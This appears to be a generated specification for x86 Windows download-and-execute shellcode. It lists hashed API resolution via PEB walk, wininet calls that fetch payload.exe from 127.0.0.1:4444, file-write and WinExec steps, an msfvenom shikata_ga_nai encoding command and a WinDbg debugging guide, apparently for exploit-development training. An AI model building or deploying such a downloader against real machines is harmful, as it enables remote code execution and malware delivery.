# Shellcode Contract

Generated from manifest.

---

# Stack Layout

Frame: `mov ebp, esp` / `sub esp, 0x200` (0x200 bytes reserved)

## Export Context (reserved - do not allocate)

| Offset | Description |
|--------|-------------|
| `[ebp-0x04]` | Module base (transient) |
| `[ebp-0x08]` | AddressOfNames VA |
| `[ebp-0x0c]` | AddressOfNameOrdinals VA |
| `[ebp-0x10]` | AddressOfFunctions VA |
| `[ebp-0x14]` | NumberOfNames |
| `[ebp-0x18]` | Target hash (transient) |

## Module Bases

| Offset | Module |
|--------|--------|
| `[ebp-0x20]` | kernel32.dll |
| `[ebp-0x24]` | wininet.dll |

## API Table

| Offset | API | Module |
|--------|-----|--------|
| `[ebp-0x28]` | LoadLibraryA | kernel32.dll |
| `[ebp-0x2c]` | InternetOpenA | wininet.dll |
| `[ebp-0x30]` | InternetOpenUrlA | wininet.dll |
| `[ebp-0x34]` | InternetReadFile | wininet.dll |
| `[ebp-0x38]` | InternetCloseHandle | wininet.dll |
| `[ebp-0x3c]` | VirtualAlloc | kernel32.dll |
| `[ebp-0x40]` | CreateFileA | kernel32.dll |
| `[ebp-0x44]` | WriteFile | kernel32.dll |
| `[ebp-0x48]` | CloseHandle | kernel32.dll |
| `[ebp-0x4c]` | WinExec | kernel32.dll |
| `[ebp-0x50]` | ExitProcess | kernel32.dll |

## Variables

| Offset | Variable | Size |
|--------|----------|------|
| `[ebp-0x54]` | bytes_total | 4 |
| `[ebp-0x58]` | bytes_read | 4 |
| `[ebp-0x5c]` | buf_ptr | 4 |
| `[ebp-0x60]` | inet_session | 4 |
| `[ebp-0x64]` | inet_url | 4 |
| `[ebp-0x68]` | virt_buf | 4 |
| `[ebp-0x6c]` | irf_ret | 4 |
| `[ebp-0x70]` | file_handle | 4 |
| `[ebp-0x74]` | write_ret | 4 |
| `[ebp-0x78]` | exec_ret | 4 |

## Structures

_No structures._

## Strings

| Offset | Label | Value | Size |
|--------|-------|-------|------|
| `[ebp-0x10c]` | user_agent | Mozilla/5.0 | 12 |
| `[ebp-0x130]` | url | http://127.0.0.1:4444/payload.exe | 36 |
| `[ebp-0x13c]` | dst_path | C:\dest.txt | 12 |

---

# API Contracts

## kernel32.dll

Resolution: PEB walk

### API Table

| API | Hash | Slot | Category |
|-----|------|------|----------|
| LoadLibraryA | `0xec0e4e8e` | `[ebp-0x28]` | library |
| VirtualAlloc | `0x91afca54` | `[ebp-0x3c]` | memory |
| CreateFileA | `0x7c0017a5` | `[ebp-0x40]` | filesystem |
| WriteFile | `0xe80a791f` | `[ebp-0x44]` | filesystem |
| CloseHandle | `0x0ffd97fb` | `[ebp-0x48]` | synchronization |
| WinExec | `0x0e8afe98` | `[ebp-0x4c]` | process |
| ExitProcess | `0x73e2d87e` | `[ebp-0x50]` | process |

### API Details

#### LoadLibraryA

**Slot:** `[ebp-0x28]`
**Hash:** `0xec0e4e8e`
**Module:** kernel32.dll
**Category:** library

```c
HMODULE LoadLibraryA(LPCSTR lpLibFileName)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | lpLibFileName | LPCSTR | e.g. ws2_32.dll |

---

#### VirtualAlloc

**Slot:** `[ebp-0x3c]`
**Hash:** `0x91afca54`
**Module:** kernel32.dll
**Category:** memory

```c
LPVOID VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | lpAddress | LPVOID | NULL to let OS choose; or preferred address |
| 2 | dwSize | SIZE_T | size of region in bytes |
| 3 | flAllocationType | DWORD | MEM_COMMIT|MEM_RESERVE = 0x3000 |
| 4 | flProtect | DWORD | PAGE_EXECUTE_READWRITE = 0x40 |

---

#### CreateFileA

**Slot:** `[ebp-0x40]`
**Hash:** `0x7c0017a5`
**Module:** kernel32.dll
**Category:** filesystem

```c
HANDLE CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | lpFileName | LPCSTR |  |
| 2 | dwDesiredAccess | DWORD | GENERIC_READ=0x80000000, GENERIC_WRITE=0x40000000 |
| 3 | dwShareMode | DWORD | 0 for exclusive |
| 4 | lpSecurityAttributes | LPSECURITY_ATTRIBUTES | NULL |
| 5 | dwCreationDisposition | DWORD | OPEN_EXISTING=3, CREATE_ALWAYS=2 |
| 6 | dwFlagsAndAttributes | DWORD | FILE_ATTRIBUTE_NORMAL=0x80 |
| 7 | hTemplateFile | HANDLE | NULL |

---

#### WriteFile

**Slot:** `[ebp-0x44]`
**Hash:** `0xe80a791f`
**Module:** kernel32.dll
**Category:** filesystem

```c
BOOL WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | hFile | HANDLE | handle from CreateFileA |
| 2 | lpBuffer | LPCVOID | pointer to source buffer |
| 3 | nNumberOfBytesToWrite | DWORD | number of bytes to write |
| 4 | lpNumberOfBytesWritten | LPDWORD | pointer to DWORD for bytes written; NULL if lpOverlapped set |
| 5 | lpOverlapped | LPOVERLAPPED | NULL for synchronous I/O |

---

#### CloseHandle

**Slot:** `[ebp-0x48]`
**Hash:** `0x0ffd97fb`
**Module:** kernel32.dll
**Category:** synchronization

```c
BOOL CloseHandle(HANDLE hObject)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | hObject | HANDLE | handle to close; returns nonzero on success |

---

#### WinExec

**Slot:** `[ebp-0x4c]`
**Hash:** `0x0e8afe98`
**Module:** kernel32.dll
**Category:** process

```c
UINT WinExec(LPCSTR lpCmdLine, UINT uCmdShow)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | lpCmdLine | LPCSTR | pointer to command string, e.g. cmd.exe |
| 2 | uCmdShow | UINT | SW_SHOWNORMAL = 1 or SW_HIDE = 0 |

---

#### ExitProcess

**Slot:** `[ebp-0x50]`
**Hash:** `0x73e2d87e`
**Module:** kernel32.dll
**Category:** process

```c
VOID ExitProcess(UINT uExitCode)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | uExitCode | UINT | 0 for clean exit |

---

## wininet.dll

Resolution: `LoadLibraryA("wininet.dll")` -> base stored at `[ebp-0x24]`

### API Table

| API | Hash | Slot | Category |
|-----|------|------|----------|
| InternetOpenA | `0x57e84429` | `[ebp-0x2c]` | internet |
| InternetOpenUrlA | `0x7e0fed49` | `[ebp-0x30]` | internet |
| InternetReadFile | `0x5fe34b8b` | `[ebp-0x34]` | internet |
| InternetCloseHandle | `0xfa9b69c7` | `[ebp-0x38]` | internet |

### API Details

#### InternetOpenA

**Slot:** `[ebp-0x2c]`
**Hash:** `0x57e84429`
**Module:** wininet.dll
**Category:** internet

```c
HINTERNET InternetOpenA(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | lpszAgent | LPCSTR | user-agent string, e.g. Mozilla/5.0 |
| 2 | dwAccessType | DWORD | INTERNET_OPEN_TYPE_DIRECT = 1 |
| 3 | lpszProxy | LPCSTR | NULL for direct |
| 4 | lpszProxyBypass | LPCSTR | NULL |
| 5 | dwFlags | DWORD | 0 |

---

#### InternetOpenUrlA

**Slot:** `[ebp-0x30]`
**Hash:** `0x7e0fed49`
**Module:** wininet.dll
**Category:** internet

```c
HINTERNET InternetOpenUrlA(HINTERNET hInternet, LPCSTR lpszUrl, LPCSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwFlags, DWORD_PTR dwContext)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | hInternet | HINTERNET | handle from InternetOpenA |
| 2 | lpszUrl | LPCSTR | full URL, e.g. http://192.168.1.10/payload.exe |
| 3 | lpszHeaders | LPCSTR | NULL for default headers |
| 4 | dwHeadersLength | DWORD | 0 if lpszHeaders is NULL |
| 5 | dwFlags | DWORD | INTERNET_FLAG_RELOAD = 0x80000000; or 0 |
| 6 | dwContext | DWORD_PTR | 0 |

---

#### InternetReadFile

**Slot:** `[ebp-0x34]`
**Hash:** `0x5fe34b8b`
**Module:** wininet.dll
**Category:** internet

```c
BOOL InternetReadFile(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | hFile | HINTERNET | handle from InternetOpenUrlA |
| 2 | lpBuffer | LPVOID | pointer to receive buffer |
| 3 | dwNumberOfBytesToRead | DWORD | size of lpBuffer |
| 4 | lpdwNumberOfBytesRead | LPDWORD | pointer to DWORD for bytes read |

---

#### InternetCloseHandle

**Slot:** `[ebp-0x38]`
**Hash:** `0xfa9b69c7`
**Module:** wininet.dll
**Category:** internet

```c
BOOL InternetCloseHandle(HINTERNET hInternet)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | hInternet | HINTERNET | any HINTERNET handle to close |

---

---

# Structure Layouts

---

# Operational Cheatsheet

**Template:** IRHttpDownloadTemplate
**Target:** `127.0.0.1:4444`
**Bad characters:** `0x00` `0x0a` `0x0d`

## Setup Commands

**Serve file via HTTP:**
```
python3 -m http.server 4444 --bind 127.0.0.1
```

**URL fetched:**
```
http://127.0.0.1:4444/payload.exe
```

**Written to:**
```
C:\dest.txt
```

**Auto-executed via WinExec after download:**
```

```

## Encoding (if needed)

Remove bad chars with msfvenom (requires `shellcode.bin`):
```
cat shellcode.bin | msfvenom --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -f python -v shellcode
```

---

# WinDbg Cheatsheet

Run `debug_runner.py` under 32-bit Python. Attach WinDbg to the
python.exe process. Set `bp <address>` using the printed shellcode
address, then press Enter in the script to start execution.

## Quick Reference

| Command | Description |
|---------|-------------|
| `bp <addr>` | Set breakpoint |
| `bl` | List breakpoints |
| `g` | Go (continue) |
| `t` | Step into |
| `p` | Step over |
| `pt` | Step to next return |
| `r` | Show all registers |
| `r eax` | Show one register |
| `u eip L10` | Disassemble next 16 instructions |
| `db <addr> L<n>` | Dump bytes |
| `dd <addr> L<n>` | Dump dwords |
| `da <addr>` | Dump ASCII string |
| `!address <addr>` | Show memory region info |

## Inspect API Pointers After Resolution

After the PEB walk and hash resolution, each resolved function
pointer is stored at its stack slot. Verify with:

```
dd ebp-0x28 L1    ; LoadLibraryA
dd ebp-0x2c L1    ; InternetOpenA
dd ebp-0x30 L1    ; InternetOpenUrlA
dd ebp-0x34 L1    ; InternetReadFile
dd ebp-0x38 L1    ; InternetCloseHandle
dd ebp-0x3c L1    ; VirtualAlloc
dd ebp-0x40 L1    ; CreateFileA
dd ebp-0x44 L1    ; WriteFile
dd ebp-0x48 L1    ; CloseHandle
dd ebp-0x4c L1    ; WinExec
dd ebp-0x50 L1    ; ExitProcess
```

## Inspect Structures Before API Calls

## Inspect Stack Strings

```
da ebp-0x10c    ; user_agent
```

```
da ebp-0x130    ; url
```

```
da ebp-0x13c    ; dst_path
```

## Breakpoint Strategy

Set breakpoints at each `call [ebp-0xNN]` in the generated
assembly to pause before each API call. After each call, check
`eax` for the return value:

```
bp <sc_base>+<offset_of_call_LoadLibraryA>
bp <sc_base>+<offset_of_call_InternetOpenA>
bp <sc_base>+<offset_of_call_InternetOpenUrlA>
bp <sc_base>+<offset_of_call_InternetReadFile>
bp <sc_base>+<offset_of_call_InternetCloseHandle>
bp <sc_base>+<offset_of_call_VirtualAlloc>
bp <sc_base>+<offset_of_call_CreateFileA>
bp <sc_base>+<offset_of_call_WriteFile>
bp <sc_base>+<offset_of_call_CloseHandle>
bp <sc_base>+<offset_of_call_WinExec>  ; eax>31 on success
bp <sc_base>+<offset_of_call_ExitProcess>  ; does not return
```

Find the call offsets by searching `generated.asm` for
`call [ebp-` instructions. Add the instruction's line offset
from the start of the shellcode to the base address.